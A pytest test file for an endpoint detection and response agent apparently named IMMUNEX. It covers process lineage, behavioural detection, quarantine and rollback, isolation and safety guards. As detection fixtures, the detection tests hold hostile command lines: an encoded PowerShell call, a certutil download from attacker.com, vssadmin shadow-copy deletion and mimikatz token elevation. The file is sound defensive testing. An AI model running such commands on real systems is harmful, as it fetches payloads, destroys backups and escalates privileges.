"""
IMMUNEX EDR Capabilities Tests
===============================
Validates live process lineage traversal, active EDR containment actions,
safety guards, quarantine integrity, and rollback mechanics.
"""

import os
import sys
import json
import shutil
import pytest
import psutil
from pathlib import Path
from unittest import mock

from agents.endpoint_agent import EndpointAgent
from core.mitigation_actions import (
    isolate_endpoint,
    kill_process_tree,
    quarantine_file,
    revoke_credentials,
    rollback_changes,
    audit_log_action
)


@pytest.fixture
def agent():
    """Returns an instance of EndpointAgent for testing."""
    return EndpointAgent(
        agent_id="test_edr_agent",
        server_url="http://localhost:8080",
        hostname="TEST-HOST-01",
        ip="192.168.1.100",
        os_type="Windows" if sys.platform.startswith("win32") else "Linux"
    )


# ─── 1. Process Lineage & Telemetry Verification ──────────────────────────────

def test_process_lineage_traversal(agent):
    """Ensures get_process_lineage correctly traverses parent processes to the root."""
    current_pid = os.getpid()
    lineage = agent.get_process_lineage(current_pid)
    
    assert isinstance(lineage, list)
    assert len(lineage) >= 1
    
    # The first item in lineage should be the current process
    current_node = lineage[0]
    assert current_node["pid"] == current_pid
    assert current_node["name"] != ""
    assert "ppid" in current_node
    assert "cmdline" in current_node
    assert "username" in current_node


def test_yara_behavioral_scan_encoded_powershell(agent):
    """Validates detecting encoded PowerShell patterns."""
    cmdline = "powershell.exe -enc cABvAHcAZQByAHMAaABlAGwAbAA="
    sigs = agent.yara_behavioral_scan("powershell.exe", cmdline)
    assert "ENCODED_POWERSHELL" in sigs


def test_yara_behavioral_scan_lolbin(agent):
    """Validates detecting LOLBins with suspicious parameters."""
    cmdline = "certutil -urlcache -split -decode http://attacker.com/mal.exe"
    sigs = agent.yara_behavioral_scan("certutil.exe", cmdline)
    assert "LOLBIN_SUSPICIOUS_PARAM_CERTUTIL" in sigs


def test_yara_behavioral_scan_ransomware(agent):
    """Validates detecting ransomware behaviors like shadow copy deletion."""
    cmdline = "vssadmin.exe delete shadows /all /quiet"
    sigs = agent.yara_behavioral_scan("vssadmin.exe", cmdline)
    assert "RANSOMWARE_MUTATION_VSSADMIN" in sigs


def test_yara_behavioral_scan_privilege_escalation(agent):
    """Validates detecting privilege escalation commands."""
    cmdline = "mimikatz.exe token::elevate"
    sigs = agent.yara_behavioral_scan("mimikatz.exe", cmdline)
    assert "PRIVILEGE_ESCALATION_MIMIKATZ" in sigs or "PRIVILEGE_ESCALATION_TOKEN_ELEVATE" in sigs


def test_collect_live_processes(agent):
    """Validates enumerating active host processes."""
    procs = agent.collect_live_processes(limit=5)
    assert isinstance(procs, list)
    assert len(procs) > 0
    # Every process dict should have standard metadata keys
    for p in procs:
        assert "pid" in p
        assert "ppid" in p
        assert "process_name" in p
        assert "command_line" in p
        assert "threat_level" in p


def test_collect_live_connections(agent):
    """Validates listing network sockets gracefully on the host."""
    conns = agent.collect_live_connections(limit=10)
    assert isinstance(conns, list)
    # Even if connection enumeration fails/is restricted, it should fall back gracefully
    if len(conns) > 0:
        c = conns[0]
        assert "family" in c
        assert "type" in c
        assert "local_address" in c
        assert "remote_address" in c


# ─── 2. Quarantine & Rollback Verification ────────────────────────────────────

def test_file_quarantine_and_rollback(tmp_path):
    """Ensures file is encrypted, original deleted, then rolled back successfully."""
    # Setup test file
    original_file = tmp_path / "test_malware.exe"
    secret_payload = b"MZ\x90\x00\x03\x00\x00\x00malicious_payload_here"
    original_file.write_bytes(secret_payload)
    
    # Setup custom quarantine directory paths
    q_dir = Path("data/quarantine")
    if q_dir.exists():
        shutil.rmtree(q_dir)
        
    audit_file = Path("data/logs/mitigation_audit.json")
    if audit_file.exists():
        audit_file.unlink()

    # Verify initial state
    assert original_file.exists()

    # 1. Execute Quarantine
    res = quarantine_file(str(original_file), dry_run=False)
    assert res["status"] == "SUCCESS"
    assert not original_file.exists()
    
    # Ensure file is saved in quarantine dir and XOR encrypted with 0x55
    q_files = list(q_dir.glob("q_*_test_malware.exe.bin"))
    assert len(q_files) == 1
    q_file = q_files[0]
    assert q_file.exists()
    
    q_data = q_file.read_bytes()
    expected_data = bytes(b ^ 0x55 for b in secret_payload)
    assert q_data == expected_data
    
    # 2. Check quarantine mapping integrity
    map_file = q_dir / "quarantine_map.json"
    assert map_file.exists()
    with open(map_file, "r") as f:
        q_map = json.load(f)
    assert q_file.name in q_map
    assert q_map[q_file.name]["original_path"] == str(original_file)

    # 3. Rollback quarantined file
    roll_res = rollback_changes(dry_run=False)
    assert roll_res["status"] == "SUCCESS"
    assert original_file.exists()
    assert original_file.read_bytes() == secret_payload
    assert not q_file.exists()
    
    # Cleanup after test
    if q_dir.exists():
        shutil.rmtree(q_dir)
    if audit_file.exists():
        audit_file.unlink()


def test_quarantine_dry_run(tmp_path):
    """Ensures quarantine dry_run mode does not modify the target file."""
    original_file = tmp_path / "test_malware_dry.exe"
    original_file.write_bytes(b"payload")
    
    res = quarantine_file(str(original_file), dry_run=True)
    assert res["status"] == "DRY_RUN"
    assert original_file.exists()
    assert original_file.read_bytes() == b"payload"


# ─── 3. EDR Firewall Isolation Dry-Run & Active Verification ──────────────────

@mock.patch("subprocess.run")
def test_isolate_endpoint_dry_run(mock_run):
    """Verifies isolation dry run behaves correctly without command execution."""
    res = isolate_endpoint("192.168.1.50", dry_run=True, management_ip="192.168.1.10")
    assert res["status"] == "DRY_RUN"
    mock_run.assert_not_called()


@mock.patch("subprocess.run")
def test_isolate_endpoint_execution(mock_run):
    """Verifies isolation runs proper OS-specific commands."""
    res = isolate_endpoint("192.168.1.50", dry_run=False, management_ip="192.168.1.10")
    assert res["status"] == "SUCCESS"
    assert mock_run.called


# ─── 4. EDR Safety Guards Verification ────────────────────────────────────────

def test_system_pid_safety_guards():
    """Ensures EDR rejects killing system critical processes."""
    # Core system PIDs
    for sys_pid in [0, 1, 4]:
        res = kill_process_tree(sys_pid, dry_run=False)
        assert res["status"] == "SKIPPED"
        assert "Safety Guard" in res["details"]["reason"]

    # Current IMMUNEX runtime process
    res_self = kill_process_tree(os.getpid(), dry_run=False)
    assert res_self["status"] == "SKIPPED"
    assert "Safety Guard" in res_self["details"]["reason"]


def test_quarantine_path_safety_guards(tmp_path):
    """Ensures EDR rejects quarantining critical OS or IMMUNEX runtime files."""
    # 1. First test workspace file safety guard (this file exists)
    workspace_file = Path("main.py").resolve()
    if workspace_file.exists():
        res = quarantine_file(str(workspace_file), dry_run=False)
        assert res["status"] == "SKIPPED"
        assert "Safety Guard" in res["details"]["reason"]

    # 2. Test system paths safety guards using mocks for existence
    with mock.patch("pathlib.Path.exists", return_value=True), \
         mock.patch("pathlib.Path.is_file", return_value=True):
        
        # Decide which system paths to test based on platform
        if sys.platform.startswith("win32"):
            test_paths = ["C:\\Windows\\System32\\kernel32.dll", "C:\\Program Files\\Common Files"]
        else:
            test_paths = ["/bin/bash", "/etc/passwd"]

        for path in test_paths:
            res = quarantine_file(path, dry_run=False)
            assert res["status"] == "SKIPPED"
            assert "Safety Guard" in res["details"]["reason"]


def test_isolate_endpoint_safety_guards():
    """Ensures isolation skips critical infrastructure loopbacks."""
    for loopback in ["127.0.0.1", "0.0.0.0", "localhost"]:
        res = isolate_endpoint(loopback, dry_run=False)
        assert res["status"] == "SKIPPED"
        assert "Safety Guard" in res["details"]["reason"]


def test_revoke_credentials_safety_guards():
    """Ensures credentials revocation avoids locking out administrators."""
    for admin_user in ["root", "administrator", "admin", "system"]:
        res = revoke_credentials(admin_user, dry_run=False)
        assert res["status"] == "SKIPPED"
        assert "Safety Guard" in res["details"]["reason"]
